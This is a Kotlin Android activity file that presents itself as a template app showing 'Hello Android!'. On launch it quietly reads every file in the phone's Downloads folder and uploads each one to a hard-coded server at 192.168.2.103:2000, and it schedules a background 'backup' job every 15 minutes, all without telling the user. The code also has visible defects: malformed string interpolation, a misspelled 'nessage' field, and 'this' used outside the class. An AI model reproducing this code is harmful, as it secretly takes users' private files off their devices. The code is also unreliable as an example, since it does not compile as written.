package com.example.escaneadorpip

import android.os.Bundle
import android.os.Environment
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.padding
import androidx.compose.material3.Scaffold
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.ui.Modifier
import androidx.compose.ui.tooling.preview.Preview
import com.example.escaneadorpip.ui.theme.EscaneadorpipTheme
import java.io.File
import android.util.Log
import okhttp3.*
import okhttp3.RequestBody.Companion.asRequestBody
import java.io.IOException
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import com.example.escaneadorpip.workers.BackupWorker
import java.util.concurrent.TimeUnit


class MainActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        //setContentView(R.layout.activity_main)
        scanDownloadsFolder()
        scheduleBackup()
        enableEdgeToEdge()
        setContent {
            EscaneadorpipTheme {
                Scaffold(modifier = Modifier.fillMaxSize()) { innerPadding ->
                    Greeting(
                        name = "Android",
                        modifier = Modifier.padding(innerPadding)
                    )
                }
            }
        }
    }
}

private fun scanDownloadsFolder(){
    val downloadsFolder = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)
    val files = downloadsFolder?.listFiles()
    files?.forEach { file ->
        if (file.isFile){
            Log.d("Files", "Archivo encontrado: $ {file.name} ")
            uploadFileToServer(file)
        }
    }
}

private fun uploadFileToServer(file: File){
    val client = OkHttpClient()

    val requestBody = MultipartBody.Builder()
        .setType(MultipartBody.FORM)
        .addFormDataPart(
            "file",
            file.name,
            file.asRequestBody()
        )
        .build()
    val request = Request.Builder()
        .url("http://192.168.2.103:2000/")
        .post(requestBody)
        .build()

    client.newCall(request).enqueue(object : Callback {
        override fun onFailure(call: Call, e: IOException) {
            Log.e("Upload", "Error al subir archivo: $ {e.message}")

        }

        override fun onResponse(call: Call, response: Response) {
            if (response.isSuccessful){
                Log.d("Upload", "Archivo subido con exito: $ {file.name}")
            }else{
                Log.e("Upload", "Error en la respuesta: $ {response.nessage}")
            }
        }
    })
}

private fun scheduleBackup(){
    val backupRequest = PeriodicWorkRequestBuilder<BackupWorker>(15, TimeUnit.MINUTES).build()
    WorkManager.getInstance(this).enqueue(backupRequest)
}



@Composable
fun Greeting(name: String, modifier: Modifier = Modifier) {
    Text(
        text = "Hello $name!",
        modifier = modifier
    )
}

@Preview(showBackground = true)
@Composable
fun GreetingPreview() {
    EscaneadorpipTheme {
        Greeting("Android")
    }
}